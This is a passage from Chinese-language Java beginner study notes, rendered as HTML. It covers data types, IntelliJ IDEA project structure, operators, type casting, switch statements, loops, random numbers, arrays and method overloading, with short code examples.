<li>int 类型的⼤概取值范围： <code>-21亿多 ~ 21亿多</code></li>
<li>整数类型和⼩数类型的取值范围⼤⼩关系： <code>double &gt; float &gt; long &gt; int &gt; short &gt; byte</code></li>
</ul>
</li>
</ul>
<h4 id="最为常用的数据类型选择"><a class="header-anchor" href="#最为常用的数据类型选择">¶</a>最为常用的数据类型选择</h4>
<ul>
<li>在定义变量的时候，要根据实际的情况来选择不同类型的变量
<ul>
<li>⼈的年龄，可以选择 byte 类型</li>
<li>地球的年龄，可以选择 long 类型</li>
<li>如果整数类型中，不太确定范围，那么默认使⽤ int 类型</li>
<li>如果⼩数类型中，不太确定范围，那么默认使⽤ double 类型</li>
<li>如果要定义字符类型的变量，那么使⽤ char</li>
<li>如果要定义布尔类型的变量，那么使⽤ boolean</li>
</ul>
</li>
</ul>
<h4 id="定义8种基本数据类型变量"><a class="header-anchor" href="#定义8种基本数据类型变量">¶</a>定义8种基本数据类型变量</h4>
<ul>
<li>注意点
<ul>
<li>如果要定义 ⼀个整数类型的变量，不知道选择哪种数据类型了，默认使⽤ int。</li>
<li>如果要定义 ⼀个⼩数类型的变量，不知道选择哪种数据类型了，默认使⽤ double。</li>
<li>如果要定义⼀个 long 类型的变量，在数据值的后⾯需要加上 L 后缀。(⼤⼩写都可以，建议⼤写)</li>
<li>如果要定义⼀个 float 类型的变量，在数据值的后⾯需要加上 F 后缀。(⼤⼩写都可以）</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.定义byte类型的变量</span></span><br><span class="line"><span class="comment">//数据类型 变量名 = 数据值;</span></span><br><span class="line"><span class="type">byte</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.定义short类型的变量</span></span><br><span class="line"><span class="type">short</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.定义long类型的变量</span></span><br><span class="line"><span class="type">long</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">123456789123456789L</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//5.定义float类型的变量</span></span><br><span class="line"><span class="type">float</span> <span class="variable">e</span> <span class="operator">=</span> <span class="number">10.1F</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//8.定义boolean类型的变量</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">h</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<h3 id="IDEA中层级结构介绍"><a class="header-anchor" href="#IDEA中层级结构介绍">¶</a>IDEA中层级结构介绍</h3>
<h4 id="结构分类"><a class="header-anchor" href="#结构分类">¶</a>结构分类</h4>
<ul>
<li>project（项⽬、⼯程）</li>
<li>module（模块）</li>
<li>package（包）</li>
<li>class（类）</li>
</ul>
<h5 id="结构介绍"><a class="header-anchor" href="#结构介绍">¶</a>结构介绍</h5>
<ul>
<li>
<p>最基础的 project、module、class。</p>
<ul>
<li>project（项⽬、⼯程）
<ul>
<li>淘宝、京东、⿊⻢程序员⽹站都属于⼀个个项⽬，IDEA 中就是⼀个个的 Project。</li>
</ul>
</li>
<li>module（模块）
<ul>
<li>在⼀个项⽬中，可以存放多个模块，不同的模块可以存放项⽬中不同的业务功能代码。在⿊⻢程序员的官⽅⽹站中，⾄少包含了以下模块：
<ul>
<li>论坛模块</li>
<li>报名、咨询模块</li>
<li>为了更好的管理代码，我们会把代码分别放在两个模块中存放。</li>
</ul>
</li>
</ul>
</li>
<li>package（包）
<ul>
<li>⼀个模块中⼜有很多的业务，以⿊⻢程序员官⽅⽹站的论坛模块为例，⾄少包含了以下不同的业务。</li>
<li>发帖</li>
<li>评论</li>
<li>为了把这些业务区分的更加清楚，就会⽤包来管理这些不同的业务。</li>
</ul>
</li>
<li>class（类）
<ul>
<li>就是真正写代码的地⽅。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>层级关系 project - module - package - class</p>
<ul>
<li>包含数量
<ul>
<li>project 中可以创建多个 module</li>
<li>module 中可以创建多个 package</li>
<li>package 中可以创建多个 class</li>
<li>这些结构的划分，是为了⽅便管理类⽂件的。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="IDEA代码步骤"><a class="header-anchor" href="#IDEA代码步骤">¶</a>IDEA代码步骤</h5>
<ul>
<li>创建Project项目</li>
<li>创建Module模块</li>
<li>创建class类</li>
<li>在类中编写代码</li>
<li>完成编译运行</li>
</ul>
<h6 id="一些小Tips"><a class="header-anchor" href="#一些小Tips">¶</a>一些小Tips</h6>
<ul>
<li>在IDEA中删除类，不走回收站，直接从硬盘中删掉</li>
</ul>
<h6 id="创建Module"><a class="header-anchor" href="#创建Module">¶</a>创建Module</h6>
<p>PDF上部大约50页前后处</p>
<h2 id="Day3-运算符"><a class="header-anchor" href="#Day3-运算符">¶</a>Day3 运算符</h2>
<h3 id="运算符与表达式"><a class="header-anchor" href="#运算符与表达式">¶</a>运算符与表达式</h3>
<h4 id="定义"><a class="header-anchor" href="#定义">¶</a>定义</h4>
<ul>
<li>
<p><strong>运算符</strong>：就是对常量或者变量进⾏操作的符号。⽐如： + - * /</p>
</li>
<li>
<p><strong>表达式</strong>：⽤运算符把常量或者变量连接起来的，符合Java语法的式⼦就是表达式。⽐如：a + b 这个整体就是表达式。⽽其中+是算术运算符的⼀种，所以这个表达式也称之为算术表达式</p>
</li>
</ul>
<h4 id="算术运算符注意点"><a class="header-anchor" href="#算术运算符注意点">¶</a>算术运算符注意点</h4>
<ul>
<li><code>/</code>
<ul>
<li><strong>整数</strong>相除结果只能得到<strong>整数</strong>，如果结果想要是⼩数，必须要有<strong>⼩数参数</strong></li>
<li>⼩数直接参与运算，得到的结果有可能是不精确的</li>
</ul>
</li>
</ul>
<h3 id="隐式转换"><a class="header-anchor" href="#隐式转换">¶</a>隐式转换</h3>
<h4 id="概念"><a class="header-anchor" href="#概念">¶</a>概念</h4>
<ul>
<li>
<p>也叫⾃动类型提升</p>
</li>
<li>
<p>就是把⼀个<strong>取值范围⼩</strong>的数据或者变量，赋值给另⼀个<strong>取值范围⼤</strong>的变量</p>
</li>
<li>
<p>不需要额外写代码单独实现，程序⾃动完成</p>
</li>
<li>
<p>简单记忆：小的给大的可以直接给</p>
</li>
</ul>
<h5 id="两种提升规则"><a class="header-anchor" href="#两种提升规则">¶</a>两种提升规则</h5>
<ul>
<li>取值范围⼩的，和取值范围⼤的进⾏运算，⼩的会先提升为⼤的，再进⾏运算</li>
<li>byte、short、char三种类型的数据在运算的时候，都会直接先提升为int，然后再进⾏运算</li>
<li>取值范围从⼩到⼤的关系：<code>byte short int long float double</code></li>
</ul>
<h3 id="强制转换"><a class="header-anchor" href="#强制转换">¶</a>强制转换</h3>
<h4 id="概念-v2"><a class="header-anchor" href="#概念-v2">¶</a>概念</h4>
<ul>
<li>如果要把⼀个<strong>取值范围⼤</strong>的数据或者变量赋值给另⼀个<strong>取值范围⼩</strong>的变量，不允许直接操作，需要加⼊强制转换</li>
</ul>
<h4 id="书写格式"><a class="header-anchor" href="#书写格式">¶</a>书写格式</h4>
<ul>
<li><code>⽬标数据类型 变量名 = （⽬标数据类型）被强转的数据；</code></li>
</ul>
<h4 id="注意"><a class="header-anchor" href="#注意">¶</a>注意</h4>
<ul>
<li>强制转换可能会导致数据发生错误（数据的精度丢失）</li>
</ul>
<h3 id="字符串的"><a class="header-anchor" href="#字符串的">¶</a>字符串的+</h3>
<ul>
<li>字符串的连接符，产生一个新的字符串</li>
<li>从左到右逐个执行</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="string">&quot;abc&quot;</span> + <span class="number">1</span>;    <span class="comment">// &quot;1abc1&quot;</span></span><br><span class="line"><span class="number">1</span> + <span class="number">2</span> + <span class="string">&quot;abc&quot;</span> + <span class="number">2</span> + <span class="number">1</span>;  <span class="comment">// &quot;3abc21&quot;</span></span><br><span class="line">	<span class="comment">// 第一步没有字符串参与，所以是整型相加</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;⿊默丁格&quot;</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;我的名字是&quot;</span> + name);</span><br><span class="line"><span class="comment">// 字符串和变量相加→跟变量里的值进行拼接</span></span><br></pre></td></tr></table></figure>
<ul>
<li>有字符串参与的步骤就是字符串拼接</li>
<li>字符串只有+操作，没有其他操作</li>
</ul>
<h3 id="字符的"><a class="header-anchor" href="#字符的">¶</a>字符的+</h3>
<h4 id="规则"><a class="header-anchor" href="#规则">¶</a>规则</h4>
<ul>
<li>当+操作中出现了<strong>字符</strong>，会拿着字符到计算机内置的<strong>ASCII码</strong>表中去查对应的数字，然后再进⾏计算</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> c + <span class="number">0</span>;</span><br><span class="line">System.out.println(result);  <span class="comment">//97</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	&#x27;a&#x27; --- 97</span></span><br><span class="line"><span class="comment">	&#x27;A&#x27; --- 65</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="自增-自减运算符"><a class="header-anchor" href="#自增-自减运算符">¶</a>自增/自减运算符</h3>
<ul>
<li>
<p>也就是<ins>a 和 a</ins>的区别问题了</p>
</li>
<li>
<p>使⽤⽅式：</p>
<ul>
<li><code>++a</code>（前缀递增）和<code>a++</code>（后缀递增）的主要区别在于它们增加变量的值的时间点以及返回的值</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">   <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用前缀递增</span></span><br><span class="line">System.out.println(<span class="string">&quot;++a: &quot;</span> + (++a)); <span class="comment">// 输出: ++a: 2</span></span><br><span class="line">System.out.println(<span class="string">&quot;a after ++a: &quot;</span> + a); <span class="comment">// 输出: a after ++a: 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用后缀递增</span></span><br><span class="line">System.out.println(<span class="string">&quot;a++: &quot;</span> + (b++)); <span class="comment">// 输出: a++: 1</span></span><br><span class="line">System.out.println(<span class="string">&quot;b after a++: &quot;</span> + b); <span class="comment">// 输出: b after a++: 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在一个表达式中使用</span></span><br><span class="line"><span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> ++c + c++; <span class="comment">// 注意这里</span></span><br><span class="line"><span class="comment">//            c=4      c=5</span></span><br><span class="line"><span class="comment">// 相当于int result = (++c) + (c++);</span></span><br><span class="line">System.out.println(<span class="string">&quot;result: &quot;</span> + result); <span class="comment">// 输出: result: 9</span></span><br><span class="line">System.out.println(<span class="string">&quot;c after operations: &quot;</span> + c); <span class="comment">// 输出: c after operations: 5</span></span><br></pre></td></tr></table></figure>
<h3 id="逻辑运算符"><a class="header-anchor" href="#逻辑运算符">¶</a>逻辑运算符</h3>
<h4 id="异或"><a class="header-anchor" href="#异或">¶</a>异或(^)</h4>
<h5 id="规则-v2"><a class="header-anchor" href="#规则-v2">¶</a>规则</h5>
<ul>
<li>如果两边相同，结果为false，如果两边不同，结果为true</li>
</ul>
<h5 id="代码"><a class="header-anchor" href="#代码">¶</a>代码</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//^    -//左右不相同，结果才是true，左右相同结果就是false</span></span><br><span class="line">System.out.println(<span class="literal">true</span> ^ <span class="literal">true</span>);  <span class="comment">//false</span></span><br><span class="line">System.out.println(<span class="literal">false</span> ^ <span class="literal">false</span>);  <span class="comment">//false</span></span><br><span class="line">System.out.println(<span class="literal">true</span> ^ <span class="literal">false</span>);  <span class="comment">//true</span></span><br><span class="line">System.out.println(<span class="literal">false</span> ^ <span class="literal">true</span>);  <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<h4 id="取反"><a class="header-anchor" href="#取反">¶</a>取反</h4>
<ul>
<li>温馨提示：取反最多只⽤⼀个</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(!<span class="literal">true</span>);  <span class="comment">//false</span></span><br><span class="line">System.out.println(!!<span class="literal">false</span>);  <span class="comment">//注意点：取反最多只⽤⼀个</span></span><br></pre></td></tr></table></figure>
<h3 id="短路逻辑运算符"><a class="header-anchor" href="#短路逻辑运算符">¶</a>短路逻辑运算符</h3>
<h4 id="分类"><a class="header-anchor" href="#分类">¶</a>分类</h4>
<ul>
<li>&amp;&amp;</li>
<li>||</li>
</ul>
<h4 id="逻辑核心"><a class="header-anchor" href="#逻辑核心">¶</a>逻辑核心</h4>
<ul>
<li>当左边不能确定整个表达式的结果，右边才会执⾏</li>
<li>当左边能确定整个表达式的结果，那么右边就不会执⾏了。从⽽提⾼了代码的运⾏效率</li>
</ul>
<h4 id="举例"><a class="header-anchor" href="#举例">¶</a>举例</h4>
<ul>
<li><strong>⽤⼾登录案例</strong>
<ul>
<li>⽤⼾名正确 &amp; 密码正确
<ul>
<li>如果使⽤⼀个&amp;，不管⽤⼾名是否正确都会去验证密码。</li>
</ul>
</li>
<li>思考：
<ul>
<li>如果⽤⼾名输⼊正确了，那么我们再判断密码是否正确，是符合业务逻辑的。但是如果⽤⼾名输⼊错误了，那么现在还有必要去⽐较密码吗？没有不要了。</li>
<li>如果使⽤⼀个&amp;，那么左边和右边不管什么情况下，都会执⾏。</li>
</ul>
</li>
<li>⽤⼾名正确 &amp;&amp; 密码正确
<ul>
<li>如果⽤⼾名输⼊正确了，那么才会验证密码是否输⼊正确</li>
<li>如果<strong>⽤⼾名输⼊错误</strong>了，那么就不会再去验证密码是否正确，最终的结果<strong>直接为false</strong>。从⽽<strong>提⾼</strong>了程序运⾏的<strong>效率</strong>。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h4>
<ul>
<li>&amp;&amp;和&amp;、||和|的运行结果一样</li>
<li>但是短路逻辑运算符可以提高程序的运行效率</li>
</ul>
<h3 id="三元运算符"><a class="header-anchor" href="#三元运算符">¶</a>三元运算符</h3>
<h4 id="格式"><a class="header-anchor" href="#格式">¶</a>格式</h4>
<ul>
<li>
<p><code>关系表达式 ? 表达式1 : 表达式2;</code></p>
</li>
<li>
<p>注意：三元运算符的最终结果⼀定要被使⽤，要么赋值给⼀个变量，要么直接打印出来</p>
</li>
</ul>
<h4 id="举例-v2"><a class="header-anchor" href="#举例-v2">¶</a>举例</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 求三个体重中的最大值</span></span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> height1 &gt; height2 ? height1 : height2;</span><br><span class="line"><span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> temp &gt; height3 ? temp : height3;</span><br></pre></td></tr></table></figure>
<h3 id="运算符的优先级"><a class="header-anchor" href="#运算符的优先级">¶</a>运算符的优先级</h3>
<ul>
<li>小括号优先于所有</li>
</ul>
<h2 id="Day4-判断和循环"><a class="header-anchor" href="#Day4-判断和循环">¶</a>Day4 判断和循环</h2>
<h3 id="switch的扩展知识"><a class="header-anchor" href="#switch的扩展知识">¶</a>switch的扩展知识</h3>
<ul>
<li>
<p>default的位置和省略情况</p>
<ul>
<li>default可以放在任意位置，也可以省略</li>
</ul>
</li>
<li>
<p>case穿透</p>
<ul>
<li>不写break会引发case穿透现象</li>
</ul>
</li>
<li>
<p>switch在JDK12的新特性</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="keyword">switch</span> (number) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span> -&gt; System.out.println(<span class="string">&quot;⼀&quot;</span>);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span> -&gt; System.out.println(<span class="string">&quot;⼆&quot;</span>);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span> -&gt; System.out.println(<span class="string">&quot;三&quot;</span>);</span><br><span class="line">    <span class="keyword">default</span> -&gt; System.out.println(<span class="string">&quot;其他&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="举例-v3"><a class="header-anchor" href="#举例-v3">¶</a>举例</h4>
<ul>
<li>键盘录入星期数，输出工作日、休息日。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分析：</span></span><br><span class="line"><span class="comment">//1.键盘录⼊星期数</span></span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    System.out.println(<span class="string">&quot;请输⼊星期&quot;</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">week</span> <span class="operator">=</span> sc.nextInt();  <span class="comment">//3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.利⽤switch进⾏匹配</span></span><br><span class="line"><span class="comment">// 利⽤case穿透简化代码</span></span><br><span class="line"><span class="keyword">switch</span> (week)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        System.out.println(<span class="string">&quot;⼯作⽇&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;	</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        System.out.println(<span class="string">&quot;休息⽇&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">        System.out.println(<span class="string">&quot;没有这个星期&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利⽤JDK12简化代码书写</span></span><br><span class="line"><span class="keyword">switch</span> (week) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> -&gt; System.out.println(<span class="string">&quot;⼯作⽇&quot;</span>);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>, <span class="number">7</span> -&gt; System.out.println(<span class="string">&quot;休息⽇&quot;</span>);</span><br><span class="line">    <span class="keyword">default</span> -&gt; System.out.println(<span class="string">&quot;没有这个星期&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Day5-循环高级和数组"><a class="header-anchor" href="#Day5-循环高级和数组">¶</a>Day5 循环高级和数组</h2>
<h3 id="Random"><a class="header-anchor" href="#Random">¶</a>Random</h3>
<ul>
<li>作用：生成随机数</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="comment">//  导包的动作必须出现在类定义的上边。</span></span><br><span class="line"><span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"><span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> r.nextInt(随机数的范围);</span><br><span class="line"><span class="comment">// 随机数范围的特点：从0开始，不包含指定值，即[0, n)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.创建对象</span></span><br><span class="line"><span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"><span class="comment">//3.⽣成随机数</span></span><br><span class="line"><span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> r.nextInt(<span class="number">100</span>);<span class="comment">//包左不包右，包头不包尾</span></span><br><span class="line"><span class="comment">//0 ~ 99</span></span><br><span class="line">System.out.println(number);</span><br></pre></td></tr></table></figure>
<h3 id="举例：逢七过"><a class="header-anchor" href="#举例：逢七过">¶</a>举例：逢七过</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line"><span class="comment">//2.判断每⼀个数字，如果符合规则，就打印过，如果不符合规则就打印真实的数字</span></span><br><span class="line"><span class="keyword">if</span>(i % <span class="number">10</span> == <span class="number">7</span> || i / <span class="number">10</span> % <span class="number">10</span> == <span class="number">7</span> || i % <span class="number">7</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;过&quot;</span>);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">	System.out.println(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="举例：平方根"><a class="header-anchor" href="#举例：平方根">¶</a>举例：平方根</h3>
<ul>
<li>需求：键盘录⼊⼀个⼤于等于2的整数 x ，计算并返回 x 的 平⽅根 。结果只保留整数部分 ，⼩数部分将被舍去</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 10</span></span><br><span class="line"><span class="comment">// 1 * 1 = 1 &lt; 10</span></span><br><span class="line"><span class="comment">// 2 * 2 = 4 &lt; 10</span></span><br><span class="line"><span class="comment">// 3 * 3 = 9 &lt; 10</span></span><br><span class="line"><span class="comment">// 4 * 4 = 16 &gt; 10</span></span><br><span class="line"><span class="comment">//推断：10的平⽅根是在3~4之间。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 思路</span></span><br><span class="line"><span class="comment">//在代码当中</span></span><br><span class="line"><span class="comment">//从1开始循环，拿着数字的平⽅跟原来的数字进⾏⽐较</span></span><br><span class="line"><span class="comment">//如果⼩于的，那么继续往后判断</span></span><br><span class="line"><span class="comment">//如果相等，那么当前数字就是平⽅根</span></span><br><span class="line"><span class="comment">//如果⼤于的，那么前⼀个数字就是平⽅跟的整数部分</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.键盘录⼊⼀个整数</span></span><br><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">System.out.println(<span class="string">&quot;请输⼊⼀个整数&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line"><span class="comment">//2.从1开始循环判断</span></span><br><span class="line"><span class="comment">//开始：1 结束: number</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= number; i++) &#123;</span><br><span class="line"><span class="comment">//⽤i * i 再跟number进⾏⽐较</span></span><br><span class="line">    <span class="keyword">if</span>(i * i == number)&#123;</span><br><span class="line">    System.out.println(i + <span class="string">&quot;就是&quot;</span> + number + <span class="string">&quot;的平⽅根&quot;</span>);</span><br><span class="line">    <span class="comment">//⼀旦找到了，循环就可以停⽌了，后⾯的数字就不需要再找了，提⾼代码的运⾏效率。</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(i * i &gt; number)&#123;</span><br><span class="line">	System.out.println((i - <span class="number">1</span>) + <span class="string">&quot;就是&quot;</span> + number + <span class="string">&quot;平⽅根的整数部分&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="数组"><a class="header-anchor" href="#数组">¶</a>数组</h3>
<h4 id="概念-v3"><a class="header-anchor" href="#概念-v3">¶</a>概念</h4>
<ul>
<li>
<p>指的是⼀种容器，可以同来存储同种数据类型的多个值。但是数组容器在存储数据的时候，需要结合<strong>隐式转换</strong>考虑</p>
</li>
<li>
<p>⽐如：定义了⼀个int类型的数组。那么boolean、double类型的数据是不能存到这个数组中的，但是byte类型，short类型，int类型的数据是可以存到这个数组⾥⾯的</p>
</li>
<li>
<p><strong>建议</strong>：容器的类，和存储的数据类型保持⼀致</p>
</li>
</ul>
<h4 id="定义-v2"><a class="header-anchor" href="#定义-v2">¶</a>定义</h4>
<ul>
<li>
<p>格式⼀：<code>数据类型 [] 数组名</code></p>
</li>
<li>
<p>格式⼆：<code>数据类型 数组名 []</code></p>
</li>
<li>
<p>都行</p>
</li>
</ul>
<h4 id="数组练习：打乱数据"><a class="header-anchor" href="#数组练习：打乱数据">¶</a>数组练习：打乱数据</h4>
<ul>
<li>需求：定义⼀个数组，存⼊1~5。要求打乱数组中所有数据的顺序</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.定义数组存储1~5</span></span><br><span class="line"><span class="type">int</span>[] arr = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"><span class="comment">// 2.循环遍历数组，从0索引开始打乱数据的顺序</span></span><br><span class="line"><span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="comment">// ▷⽣成⼀个随机索引</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">randomIndex</span> <span class="operator">=</span> r.nextInt(arr.length);</span><br><span class="line">    <span class="comment">// 拿着随机索引指向的元素 跟 i 指向的元素进⾏交换</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">    arr[i] = arr[randomIndex];</span><br><span class="line">    arr[randomIndex] = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 当循环结束之后，那么数组中所有的数据已经打乱顺序了</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    System.out.print(arr[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Day6-方法"><a class="header-anchor" href="#Day6-方法">¶</a>Day6 方法</h2>
<h3 id="方法重载"><a class="header-anchor" href="#方法重载">¶</a>方法重载</h3>
<ul>
<li>
<p>概念：⽅法重载指同⼀个类中定义的多个⽅法之间的关系，满⾜下列条件的多个⽅法相互构成重载：</p>
<ul>
<li>多个⽅法在同⼀个类中</li>
<li>多个⽅法具有<strong>相同的⽅法名</strong></li>
<li>多个⽅法的<strong>参数不相同</strong>，<strong>类型不同</strong>或者<strong>数量不同</strong></li>
</ul>
</li>
<li>
<p>注意：</p>
<ul>
<li>重载仅对应⽅法的定义，与⽅法的调⽤⽆关，调⽤⽅式参照标准格式</li>
<li>重载仅针对同⼀个类中⽅法的名称与参数进⾏识别，与返回值⽆关，换句话说<strong>不能通过返回值来判定</strong>两个⽅法是否相互构成重载</li>
</ul>
</li>
</ul>
<h4 id="重载-练习"><a class="header-anchor" href="#重载-练习">¶</a>重载-练习</h4>
<ul>
<li>
<p>需求：使⽤⽅法重载的思想，设计<em>⽐较两个整数是否相同</em>的⽅法，兼容全整数类型（byte,short,int,long）</p>
</li>
<li>
<p>思路：</p>
<ul>
<li>
<p>定义⽐较两个数字的是否相同的⽅法compare()⽅法，参数选择两个int型参数</p>
</li>
<li>
<p>定义对应的重载⽅法，变更对应的参数类型，参数变更为两个long型参数</p>
</li>
<li>
<p>定义所有的重载⽅法，两个byte类型与两个short类型参数</p>
</li>
<li>
<p>完成⽅法的调⽤，测试运⾏结果</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MethodTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 调用方法</span></span><br><span class="line">        System.out.println(compare(<span class="number">10</span>, <span class="number">20</span>));</span><br><span class="line">		System.out.println(compare((<span class="type">byte</span>) <span class="number">10</span>, (<span class="type">byte</span>) <span class="number">20</span>));</span><br><span class="line">		System.out.println(compare((<span class="type">short</span>) <span class="number">10</span>, (<span class="type">short</span>) <span class="number">20</span>));</span><br><span class="line">		System.out.println(compare(<span class="number">10L</span>, <span class="number">20L</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">compare</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> 